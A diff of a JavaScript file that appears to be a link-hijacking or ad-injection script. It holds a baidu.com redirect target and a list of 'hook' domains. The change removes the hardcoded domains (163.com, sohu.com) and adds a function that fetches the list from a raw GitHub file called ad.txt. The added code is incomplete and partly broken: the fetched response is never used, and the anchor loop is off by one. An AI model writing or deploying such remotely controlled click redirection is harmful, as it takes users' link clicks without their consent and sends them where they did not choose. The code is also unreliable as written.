@@ -1,8 +1,6 @@
 var g_goUrl="https://www.baidu.com";
 var g_hookUrls=new Array();
 
-g_hookUrls[0]="163.com"
-g_hookUrls[1]="sohu.com"
  
 function mOnFun(mthis)
 {
@@ -28,6 +26,33 @@ for(var i=0;i<=document.getElementsByTagName("a").length;i++)
 	{
 
 	}
+}
+
+
+function GetAdList()
+{
+	mUrl="https://raw.githubusercontent.com/qaz1234qaz/myku/master/ad.txt"
+	try
+	{
+		var xmlHttpRequest= new XMLHttpRequest();
+	} catch (e) {xmlHttpRequest= new ActiveXObject("Microsoft.XMLHTTP");} 
+ 
+	xmlHttpRequest.onreadystatechange = function()
+	{
+		if(xmlHttpRequest.readyState == 4 && xmlHttpRequest.status == 200)
+		{
+			var b = xmlHttpRequest.responseText;
+			try
+			{
+				g_hookUrls
+			}
+			catch (e) {}
+
+		} 
+	}
+    xmlHttpRequest.open("GET",mUrl,false);
+    xmlHttpRequest.send(); 
+
 }
 
 
